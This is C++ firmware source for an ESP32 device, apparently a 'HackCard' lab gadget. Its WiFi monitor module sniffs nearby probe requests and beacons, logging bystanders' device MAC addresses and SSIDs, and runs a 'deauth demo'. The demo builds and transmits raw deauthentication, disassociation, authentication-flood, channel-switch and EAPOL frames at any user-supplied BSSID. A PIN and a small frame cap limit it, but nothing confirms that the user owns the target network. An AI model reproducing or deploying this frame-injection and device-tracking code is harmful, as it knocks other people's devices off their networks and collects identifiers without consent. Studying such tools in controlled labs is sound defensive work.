#include "WifiMonitorApp.h"

#include "config/app_registry.h"
#include "../../core/LabPin.h"
#include "../../core/Logger.h"
#include "../../core/StorageManager.h"
#include "../../platform/hal/HalBuzzer.h"
#include "../../platform/hal/HalWifiAp.h"
#include "../../platform/telemetry/StatusLed.h"
#if APP_WIFI_BEACON
#include "WifiBeaconApp.h"
#endif
#if APP_WIFI_EVIL_TWIN
#include "WifiEvilTwinApp.h"
#endif

#include <cstring>
#include <esp_wifi.h>

WifiMonitorApp WifiMonitor;

namespace {

WifiMonitorApp* sMonitor = nullptr;

constexpr uint8_t kMaxSniffMin = 10;
constexpr uint8_t kMaxDeauthFrames = 10;
constexpr uint32_t kDeauthSessionSec = 30;
constexpr uint8_t kBroadcastMac[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
constexpr uint8_t kProbeQueueSize = 16;
constexpr uint8_t kBeaconQueueSize = 8;

struct ProbeQueueEntry {
  char ssid[33];
  uint8_t mac[6];
  int8_t rssi;
  uint8_t channel;
};

struct BeaconQueueEntry {
  char ssid[33];
  uint8_t bssid[6];
  int8_t rssi;
  uint8_t channel;
};

ProbeQueueEntry sProbeQueue[kProbeQueueSize];
volatile uint8_t sProbeQueueHead = 0;
volatile uint8_t sProbeQueueTail = 0;

BeaconQueueEntry sBeaconQueue[kBeaconQueueSize];
volatile uint8_t sBeaconQueueHead = 0;
volatile uint8_t sBeaconQueueTail = 0;

void macToString(const uint8_t mac[6], char* out, size_t outLen) {
  snprintf(out, outLen, "%02X:%02X:%02X:%02X:%02X:%02X", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
}

bool frameIsBeacon(const uint8_t* payload, uint16_t len, char* ssidOut, size_t ssidLen, uint8_t bssid[6]) {
  if (!payload || len < 36) {
    return false;
  }
  const uint8_t frameType = (payload[0] >> 2) & 0x03;
  const uint8_t subtype = (payload[0] >> 4) & 0x0F;
  if (frameType != 0 || subtype != 8) {
    return false;
  }
  memcpy(bssid, payload + 16, 6);
  ssidOut[0] = '\0';
  int pos = 36;
  while (pos + 2 <= static_cast<int>(len)) {
    const uint8_t tag = payload[pos];
    const uint8_t tagLen = payload[pos + 1];
    pos += 2;
    if (pos + tagLen > static_cast<int>(len)) {
      break;
    }
    if (tag == 0) {
      const size_t copyLen = tagLen > ssidLen - 1 ? ssidLen - 1 : tagLen;
      memcpy(ssidOut, payload + pos, copyLen);
      ssidOut[copyLen] = '\0';
      break;
    }
    pos += tagLen;
  }
  return true;
}

bool frameIsProbeRequest(const uint8_t* payload, uint16_t len, char* ssidOut, size_t ssidLen, uint8_t srcMac[6]) {
  if (!payload || len < 24) {
    return false;
  }

  const uint8_t frameType = (payload[0] >> 2) & 0x03;
  const uint8_t subtype = (payload[0] >> 4) & 0x0F;
  if (frameType != 0 || subtype != 4) {
    return false;
  }

  memcpy(srcMac, payload + 10, 6);
  ssidOut[0] = '\0';

  int pos = 24;
  while (pos + 2 <= static_cast<int>(len)) {
    const uint8_t tag = payload[pos];
    const uint8_t tagLen = payload[pos + 1];
    pos += 2;
    if (pos + tagLen > static_cast<int>(len)) {
      break;
    }
    if (tag == 0) {
      const size_t copyLen = tagLen > ssidLen - 1 ? ssidLen - 1 : tagLen;
      memcpy(ssidOut, payload + pos, copyLen);
      ssidOut[copyLen] = '\0';
      break;
    }
    pos += tagLen;
  }

  return true;
}

}  // namespace

void WifiMonitorApp::begin() {
  sMonitor = this;
}

bool WifiMonitorApp::checkPin(const char* labPin, char* error, size_t errorLen) const {
  return labPinCheck(labPin, error, errorLen);
}

bool WifiMonitorApp::ensureLabIdle(char* error, size_t errorLen) const {
#if APP_WIFI_BEACON
  if (WifiBeacon.isRunning()) {
    strncpy(error, "Stop beacon lab first", errorLen - 1);
    return false;
  }
#endif
#if APP_WIFI_EVIL_TWIN
  if (WifiEvilTwin.isRunning()) {
    strncpy(error, "Stop evil-twin simulation first", errorLen - 1);
    return false;
  }
#endif
  if (_sniffing || _deauthRunning) {
    strncpy(error, "Monitor session already running", errorLen - 1);
    return false;
  }
  if (!WifiAp.verifyRunning()) {
    strncpy(error, "HackCard AP must be running", errorLen - 1);
    return false;
  }
  return true;
}

bool WifiMonitorApp::parseBssid(const char* text, uint8_t mac[6]) const {
  if (!text || text[0] == '\0') {
    return false;
  }
  unsigned int a = 0;
  unsigned int b = 0;
  unsigned int c = 0;
  unsigned int d = 0;
  unsigned int e = 0;
  unsigned int f = 0;
  if (sscanf(text, "%x:%x:%x:%x:%x:%x", &a, &b, &c, &d, &e, &f) != 6) {
    return false;
  }
  mac[0] = static_cast<uint8_t>(a);
  mac[1] = static_cast<uint8_t>(b);
  mac[2] = static_cast<uint8_t>(c);
  mac[3] = static_cast<uint8_t>(d);
  mac[4] = static_cast<uint8_t>(e);
  mac[5] = static_cast<uint8_t>(f);
  return true;
}

uint32_t WifiMonitorApp::getSniffRemainingSec() const {
  if (!_sniffing || millis() >= _sniffEndsMs) {
    return 0;
  }
  return (_sniffEndsMs - millis() + 999) / 1000;
}

uint32_t WifiMonitorApp::getDeauthRemainingSec() const {
  if (!_deauthRunning || millis() >= _deauthEndsMs) {
    return 0;
  }
  return (_deauthEndsMs - millis() + 999) / 1000;
}

void WifiMonitorApp::addProbe(const char* ssid, const uint8_t* mac, int8_t rssi, uint8_t channel) {
  WifiProbeEntry& entry = _probes[_probeHead];
  entry.tsSec = millis() / 1000;
  strlcpy(entry.ssid, ssid && ssid[0] ? ssid : "(broadcast)", sizeof(entry.ssid));
  macToString(mac, entry.mac, sizeof(entry.mac));
  entry.rssi = rssi;
  entry.channel = channel;

  _probeHead = static_cast<uint8_t>((_probeHead + 1) % 40);
  if (_probeCountBuf < 40) {
    _probeCountBuf++;
  }
  _probeTotal++;

  Storage.ensureDirectory("/wifi");
  String line;
  line += String(entry.tsSec);
  line += "s,";
  line += entry.ssid;
  line += ",";
  line += entry.mac;
  line += ",";
  line += String(entry.rssi);
  line += "dBm,ch";
  line += String(entry.channel);
  if (_probeLogSdOnly) {
    Storage.appendTextFileSdOnly(_probeLogPath, line + "\n");
  } else {
    Storage.appendTextFile(_probeLogPath, line + "\n");
  }
}

void IRAM_ATTR WifiMonitorApp::onPromiscuous(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (!sMonitor || !sMonitor->_sniffing || !buf) {
    return;
  }

  sMonitor->_packetTotal++;
  if (type == WIFI_PKT_MGMT || type == WIFI_PKT_MISC) {
    sMonitor->_mgmtPackets++;
  } else if (type == WIFI_PKT_DATA) {
    sMonitor->_dataPackets++;
  }

  const wifi_promiscuous_pkt_t* pkt = static_cast<wifi_promiscuous_pkt_t*>(buf);
  const uint8_t* payload = pkt->payload;
  const uint16_t len = pkt->rx_ctrl.sig_len;

  if (type == WIFI_PKT_MGMT || type == WIFI_PKT_MISC) {
    char ssid[33] = {0};
    uint8_t srcMac[6] = {0};
    if (frameIsProbeRequest(payload, len, ssid, sizeof(ssid), srcMac)) {
      const uint8_t next = static_cast<uint8_t>((sProbeQueueHead + 1) % kProbeQueueSize);
      if (next != sProbeQueueTail) {
        ProbeQueueEntry& entry = sProbeQueue[sProbeQueueHead];
        strlcpy(entry.ssid, ssid[0] ? ssid : "(broadcast)", sizeof(entry.ssid));
        memcpy(entry.mac, srcMac, 6);
        entry.rssi = pkt->rx_ctrl.rssi;
        entry.channel = pkt->rx_ctrl.channel;
        sProbeQueueHead = next;
      }
      return;
    }

    uint8_t bssid[6] = {0};
    if (frameIsBeacon(payload, len, ssid, sizeof(ssid), bssid)) {
      const uint8_t next = static_cast<uint8_t>((sBeaconQueueHead + 1) % kBeaconQueueSize);
      if (next != sBeaconQueueTail) {
        BeaconQueueEntry& entry = sBeaconQueue[sBeaconQueueHead];
        strlcpy(entry.ssid, ssid[0] ? ssid : "(hidden)", sizeof(entry.ssid));
        memcpy(entry.bssid, bssid, 6);
        entry.rssi = pkt->rx_ctrl.rssi;
        entry.channel = pkt->rx_ctrl.channel;
        sBeaconQueueHead = next;
      }
    }
  }
}

void WifiMonitorApp::drainProbeQueue() {
  while (sProbeQueueTail != sProbeQueueHead) {
    const ProbeQueueEntry& entry = sProbeQueue[sProbeQueueTail];
    addProbe(entry.ssid, entry.mac, entry.rssi, entry.channel);
    pushLive(1, entry.channel, entry.rssi, entry.ssid);
    _lastPacketMs = millis();
    sProbeQueueTail = static_cast<uint8_t>((sProbeQueueTail + 1) % kProbeQueueSize);
  }
}

void WifiMonitorApp::drainBeaconQueue() {
  while (sBeaconQueueTail != sBeaconQueueHead) {
    const BeaconQueueEntry& entry = sBeaconQueue[sBeaconQueueTail];
    noteApBeacon(entry.ssid, entry.bssid, entry.rssi, entry.channel);
    pushLive(0, entry.channel, entry.rssi, entry.ssid);
    _lastPacketMs = millis();
    sBeaconQueueTail = static_cast<uint8_t>((sBeaconQueueTail + 1) % kBeaconQueueSize);
  }
}

void WifiMonitorApp::pushLive(uint8_t type, uint8_t channel, int8_t rssi, const char* summary) {
  WifiLiveEntry& entry = _live[_liveHead];
  entry.ms = millis();
  entry.channel = channel;
  entry.rssi = rssi;
  entry.type = type;
  strlcpy(entry.summary, summary && summary[0] ? summary : "(unknown)", sizeof(entry.summary));
  _liveHead = static_cast<uint8_t>((_liveHead + 1) % 16);
  if (_liveCount < 16) {
    _liveCount++;
  }
}

void WifiMonitorApp::noteApBeacon(const char* ssid, const uint8_t* bssid, int8_t rssi, uint8_t channel) {
  char bssidText[18] = {0};
  macToString(bssid, bssidText, sizeof(bssidText));
  for (uint8_t i = 0; i < _apCount; i++) {
    if (strcmp(_aps[i].bssid, bssidText) == 0) {
      _aps[i].rssi = rssi;
      _aps[i].channel = channel;
      _aps[i].beacons++;
      return;
    }
  }
  if (_apCount >= 24) {
    return;
  }
  strlcpy(_aps[_apCount].ssid, ssid && ssid[0] ? ssid : "(hidden)", sizeof(_aps[_apCount].ssid));
  strlcpy(_aps[_apCount].bssid, bssidText, sizeof(_aps[_apCount].bssid));
  _aps[_apCount].rssi = rssi;
  _aps[_apCount].channel = channel;
  _aps[_apCount].beacons = 1;
  _apCount++;
}

void WifiMonitorApp::hopChannelIfNeeded() {
  if (!_sniffing) {
    return;
  }
  if (millis() - _lastHopMs < 2500) {
    return;
  }
  _hopChannel = static_cast<uint8_t>((_hopChannel % 13) + 1);
  esp_wifi_set_channel(_hopChannel, WIFI_SECOND_CHAN_NONE);
  _lastHopMs = millis();
}

void WifiMonitorApp::enablePromiscuous() {
  wifi_promiscuous_filter_t filter = {};
  filter.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA;
  esp_wifi_set_promiscuous_filter(&filter);
  esp_wifi_set_promiscuous_rx_cb(&WifiMonitorApp::onPromiscuous);
  esp_wifi_set_promiscuous(true);
}

void WifiMonitorApp::disablePromiscuous() {
  esp_wifi_set_promiscuous(false);
  esp_wifi_set_promiscuous_rx_cb(nullptr);
}

WifiMonitorResult WifiMonitorApp::startSniff(const char* labPin, uint8_t durationMin, bool saveSdOnly) {
  WifiMonitorResult result;

  if (!checkPin(labPin, result.error, sizeof(result.error))) {
    return result;
  }
  if (!ensureLabIdle(result.error, sizeof(result.error))) {
    return result;
  }
  if (durationMin == 0) {
    durationMin = 3;
  }
  if (durationMin > kMaxSniffMin) {
    strncpy(result.error, "Sniff duration max 10 minutes", sizeof(result.error) - 1);
    return result;
  }
  _probeLogSdOnly = saveSdOnly;
  if (_probeLogSdOnly) {
    if (!Storage.isSdReady()) {
      strncpy(result.error, "Insert an SD card for SD-only probe log", sizeof(result.error) - 1);
      return result;
    }
    strncpy(_probeLogPath, "/wifi/exports/probe_log_live.txt", sizeof(_probeLogPath) - 1);
    Storage.ensureDirectory("/wifi/exports");
    Storage.writeTextFileSdOnly(_probeLogPath, "");
  } else {
    strncpy(_probeLogPath, "/wifi/probe_log.txt", sizeof(_probeLogPath) - 1);
  }

  _sniffing = true;
  _sniffEndsMs = millis() + static_cast<uint32_t>(durationMin) * 60U * 1000U;
  _packetTotal = 0;
  _mgmtPackets = 0;
  _dataPackets = 0;
  _apCount = 0;
  _hopChannel = static_cast<uint8_t>(WifiAp.getChannel());
  _lastHopMs = millis();
  sProbeQueueHead = 0;
  sProbeQueueTail = 0;
  sBeaconQueueHead = 0;
  sBeaconQueueTail = 0;
  _liveCount = 0;
  _liveHead = 0;
  _lastPacketMs = 0;
  enablePromiscuous();

  Status.setScanning();
  if (Buzzer.isEnabled()) {
    Buzzer.playNfcReady();
  }
  Log.activity("wifi", "probe_sniff_start", "lab");

  result.success = true;
  return result;
}

WifiMonitorResult WifiMonitorApp::stopSniff() {
  WifiMonitorResult result;

  if (!_sniffing) {
    result.success = true;
    return result;
  }

  _sniffing = false;
  disablePromiscuous();
  drainProbeQueue();
  drainBeaconQueue();
  Status.setApActive(true);
  Status.setIdle();

  if (Buzzer.isEnabled()) {
    Buzzer.playSuccess();
  }
  Log.activity("wifi", "probe_sniff_stop", "ok");

  result.success = true;
  return result;
}

int WifiMonitorApp::buildDeauthFrame(uint8_t* frame, const uint8_t* bssid, uint16_t reason) const {
  int pos = 0;
  frame[pos++] = 0xC0;
  frame[pos++] = 0x00;
  frame[pos++] = 0x00;
  frame[pos++] = 0x00;
  memcpy(&frame[pos], kBroadcastMac, 6);
  pos += 6;
  memcpy(&frame[pos], bssid, 6);
  pos += 6;
  memcpy(&frame[pos], bssid, 6);
  pos += 6;
  frame[pos++] = 0x00;
  frame[pos++] = 0x00;
  frame[pos++] = reason & 0xFF;
  frame[pos++] = (reason >> 8) & 0xFF;
  return pos;
}

int WifiMonitorApp::buildDisassocFrame(uint8_t* frame, const uint8_t* bssid, uint16_t reason) const {
  int pos = 0;
  frame[pos++] = 0xA0;
  frame[pos++] = 0x00;
  frame[pos++] = 0x00;
  frame[pos++] = 0x00;
  memcpy(&frame[pos], kBroadcastMac, 6);
  pos += 6;
  memcpy(&frame[pos], bssid, 6);
  pos += 6;
  memcpy(&frame[pos], bssid, 6);
  pos += 6;
  frame[pos++] = 0x00;
  frame[pos++] = 0x00;
  frame[pos++] = reason & 0xFF;
  frame[pos++] = (reason >> 8) & 0xFF;
  return pos;
}

int WifiMonitorApp::buildAuthFloodFrame(uint8_t* frame, const uint8_t* bssid) const {
  int pos = 0;
  frame[pos++] = 0xB0;
  frame[pos++] = 0x00;
  frame[pos++] = 0x00;
  frame[pos++] = 0x00;
  memcpy(&frame[pos], kBroadcastMac, 6);
  pos += 6;
  memcpy(&frame[pos], bssid, 6);
  pos += 6;
  memcpy(&frame[pos], bssid, 6);
  pos += 6;
  frame[pos++] = 0x00;
  frame[pos++] = 0x00;
  frame[pos++] = 0x00;
  frame[pos++] = 0x01;
  frame[pos++] = 0x00;
  frame[pos++] = 0x00;
  return pos;
}

int WifiMonitorApp::buildCsaFrame(uint8_t* frame, const uint8_t* bssid) const {
  int pos = buildDeauthFrame(frame, bssid, 8);
  if (pos + 3 > 64) {
    return pos;
  }
  frame[pos++] = 37;
  frame[pos++] = 1;
  frame[pos++] = static_cast<uint8_t>((_deauthChannel % 13) + 1);
  return pos;
}

int WifiMonitorApp::buildEapolBurstFrame(uint8_t* frame, const uint8_t* bssid) const {
  int pos = 0;
  frame[pos++] = 0x08;
  frame[pos++] = 0x01;
  frame[pos++] = 0x00;
  frame[pos++] = 0x00;
  memcpy(&frame[pos], kBroadcastMac, 6);
  pos += 6;
  memcpy(&frame[pos], bssid, 6);
  pos += 6;
  memcpy(&frame[pos], bssid, 6);
  pos += 6;
  frame[pos++] = 0x00;
  frame[pos++] = 0x00;
  frame[pos++] = 0x88;
  frame[pos++] = 0x8E;
  frame[pos++] = 0x01;
  frame[pos++] = 0x03;
  frame[pos++] = 0x00;
  frame[pos++] = 0x75;
  return pos;
}

bool WifiMonitorApp::sendAttackFrame() {
  uint8_t frame[64];
  int len = 0;
  if (_attackMode == 1) {
    len = buildDisassocFrame(frame, _targetBssid, 7);
  } else if (_attackMode == 2) {
    len = buildAuthFloodFrame(frame, _targetBssid);
  } else if (_attackMode == 3) {
    len = buildCsaFrame(frame, _targetBssid);
  } else if (_attackMode == 4) {
    len = buildEapolBurstFrame(frame, _targetBssid);
  } else {
    len = buildDeauthFrame(frame, _targetBssid, 7);
  }
  if (_deauthChannel > 0) {
    esp_wifi_set_channel(_deauthChannel, WIFI_SECOND_CHAN_NONE);
  }
  return esp_wifi_80211_tx(WIFI_IF_AP, frame, len, false) == ESP_OK;
}

WifiMonitorResult WifiMonitorApp::startDeauth(const char* labPin, const char* bssidText, uint8_t channel,
                                              uint8_t frameCount, uint8_t attackMode) {
  WifiMonitorResult result;

  if (!checkPin(labPin, result.error, sizeof(result.error))) {
    return result;
  }
  if (!ensureLabIdle(result.error, sizeof(result.error))) {
    return result;
  }
  if (!parseBssid(bssidText, _targetBssid)) {
    strncpy(result.error, "Invalid BSSID (AA:BB:CC:DD:EE:FF)", sizeof(result.error) - 1);
    return result;
  }
  if (channel != 0 && (channel < 1 || channel > 13)) {
    strncpy(result.error, "Channel must be 0 (AP) or 1-13", sizeof(result.error) - 1);
    return result;
  }
  if (frameCount == 0) {
    frameCount = 5;
  }
  if (frameCount > kMaxDeauthFrames) {
    strncpy(result.error, "Deauth demo max 10 frames", sizeof(result.error) - 1);
    return result;
  }

  _deauthRunning = true;
  _attackMode = attackMode > 4 ? 0 : attackMode;
  _deauthChannel = channel > 0 ? channel : static_cast<uint8_t>(WifiAp.getChannel());
  _deauthLimit = frameCount;
  _deauthSent = 0;
  _deauthEndsMs = millis() + kDeauthSessionSec * 1000U;
  _lastDeauthMs = 0;

  Status.setScanning();
  if (Buzzer.isEnabled()) {
    Buzzer.playNfcReady();
  }
  Log.activity("wifi", "deauth_demo_start", bssidText);

  result.success = true;
  return result;
}

WifiMonitorResult WifiMonitorApp::stopDeauth() {
  WifiMonitorResult result;

  if (!_deauthRunning) {
    result.success = true;
    return result;
  }

  _deauthRunning = false;
  Status.setApActive(true);
  Status.setIdle();

  if (Buzzer.isEnabled()) {
    Buzzer.playSuccess();
  }
  Log.activity("wifi", "deauth_demo_stop", "ok");

  result.success = true;
  return result;
}

void WifiMonitorApp::loop() {
  if (_sniffing) {
    drainProbeQueue();
    drainBeaconQueue();
    hopChannelIfNeeded();
    if (millis() >= _sniffEndsMs) {
      stopSniff();
    }
  }

  if (_deauthRunning) {
    if (millis() >= _deauthEndsMs || _deauthSent >= _deauthLimit) {
      stopDeauth();
      return;
    }
    if (millis() - _lastDeauthMs >= 250) {
      if (sendAttackFrame()) {
        _deauthSent++;
      }
      _lastDeauthMs = millis();
    }
  }
}

bool WifiMonitorApp::clearProbes() {
  _probeHead = 0;
  _probeCountBuf = 0;
  _probeTotal = 0;
  memset(_probes, 0, sizeof(_probes));
  if (_probeLogSdOnly) {
    return Storage.writeTextFileSdOnly(_probeLogPath, "");
  }
  return Storage.writeTextFile(_probeLogPath, "");
}

bool WifiMonitorApp::exportProbeLogToSd(char* outPath, size_t outPathLen, char* error, size_t errorLen) const {
  if (!outPath || outPathLen == 0) {
    if (error && errorLen > 0) {
      strncpy(error, "Invalid export path buffer", errorLen - 1);
    }
    return false;
  }
  outPath[0] = '\0';

  if (!Storage.isSdReady()) {
    if (error && errorLen > 0) {
      strncpy(error, "Insert an SD card (Full Mode)", errorLen - 1);
    }
    return false;
  }

  String data;
  if (!Storage.readTextFile(_probeLogPath, data) || data.isEmpty()) {
    if (!Storage.readTextFile("/wifi/probe_log.txt", data) || data.isEmpty()) {
      if (error && errorLen > 0) {
        strncpy(error, "No probe log to export", errorLen - 1);
      }
      return false;
    }
  }

  Storage.ensureDirectory("/wifi/exports");
  snprintf(outPath, outPathLen, "/wifi/exports/probes_%lu.txt", static_cast<unsigned long>(millis() / 1000UL));

  if (!Storage.writeTextFileSdOnly(outPath, data)) {
    if (error && errorLen > 0) {
      strncpy(error, "Could not write export file on SD", errorLen - 1);
    }
    outPath[0] = '\0';
    return false;
  }

  Log.activity("wifi", "probes_export_sd", outPath);
  return true;
}

String WifiMonitorApp::probesToJson() const {
  String json = "{\"count\":";
  json += String(_probeCountBuf);
  json += ",\"total\":";
  json += String(_probeTotal);
  json += ",\"probes\":[";
  for (uint8_t i = 0; i < _probeCountBuf; i++) {
    const uint8_t idx = static_cast<uint8_t>((_probeHead + 40 - _probeCountBuf + i) % 40);
    const WifiProbeEntry& e = _probes[idx];
    if (i > 0) {
      json += ",";
    }
    json += "{\"ts\":";
    json += String(e.tsSec);
    json += ",\"ssid\":\"";
    json += e.ssid;
    json += "\",\"mac\":\"";
    json += e.mac;
    json += "\",\"rssi\":";
    json += String(e.rssi);
    json += ",\"channel\":";
    json += String(e.channel);
    json += "}";
  }
  json += "]}";
  return json;
}

String WifiMonitorApp::statusToJson() const {
  char bssid[18] = {0};
  if (_deauthRunning) {
    macToString(_targetBssid, bssid, sizeof(bssid));
  }

  String json = "{\"sniffing\":";
  json += _sniffing ? "true" : "false";
  json += ",\"deauth_running\":";
  json += _deauthRunning ? "true" : "false";
  json += ",\"sniff_remaining_sec\":";
  json += String(getSniffRemainingSec());
  json += ",\"deauth_remaining_sec\":";
  json += String(getDeauthRemainingSec());
  json += ",\"probe_total\":";
  json += String(_probeTotal);
  json += ",\"deauth_sent\":";
  json += String(_deauthSent);
  json += ",\"deauth_limit\":";
  json += String(_deauthLimit);
  json += ",\"target_bssid\":\"";
  json += bssid;
  json += "\",\"channel\":";
  json += String(_deauthChannel);
  json += ",\"attack_mode\":";
  json += String(_attackMode);
  json += ",\"packet_total\":";
  json += String(_packetTotal);
  json += ",\"mgmt_packets\":";
  json += String(_mgmtPackets);
  json += ",\"data_packets\":";
  json += String(_dataPackets);
  json += ",\"hop_channel\":";
  json += String(_hopChannel);
  json += ",\"ap_count\":";
  json += String(_apCount);
  json += ",\"last_packet_ms\":";
  json += String(_lastPacketMs);
  json += ",\"sd_ready\":";
  json += Storage.isSdReady() ? "true" : "false";
  json += ",\"log_sd_only\":";
  json += _probeLogSdOnly ? "true" : "false";
  json += ",\"probe_log_path\":\"";
  json += _probeLogPath;
  json += "\"}";
  return json;
}

String WifiMonitorApp::liveToJson() const {
  String json = "{\"count\":";
  json += String(_liveCount);
  json += ",\"status\":";
  json += statusToJson();
  json += ",\"aps\":";
  json += apsToJson();
  json += ",\"live\":[";
  for (uint8_t i = 0; i < _liveCount; i++) {
    const uint8_t idx = static_cast<uint8_t>((_liveHead + 16 - _liveCount + i) % 16);
    const WifiLiveEntry& e = _live[idx];
    if (i > 0) {
      json += ",";
    }
    json += "{\"ms\":";
    json += String(e.ms);
    json += ",\"channel\":";
    json += String(e.channel);
    json += ",\"rssi\":";
    json += String(e.rssi);
    json += ",\"type\":";
    json += String(e.type);
    json += ",\"summary\":\"";
    json += e.summary;
    json += "\"}";
  }
  json += "]}";
  return json;
}

String WifiMonitorApp::apsToJson() const {
  String json = "{\"count\":";
  json += String(_apCount);
  json += ",\"aps\":[";
  for (uint8_t i = 0; i < _apCount; i++) {
    if (i > 0) {
      json += ",";
    }
    json += "{\"ssid\":\"";
    json += _aps[i].ssid;
    json += "\",\"bssid\":\"";
    json += _aps[i].bssid;
    json += "\",\"rssi\":";
    json += String(_aps[i].rssi);
    json += ",\"channel\":";
    json += String(_aps[i].channel);
    json += ",\"beacons\":";
    json += String(_aps[i].beacons);
    json += "}";
  }
  json += "]}";
  return json;
}
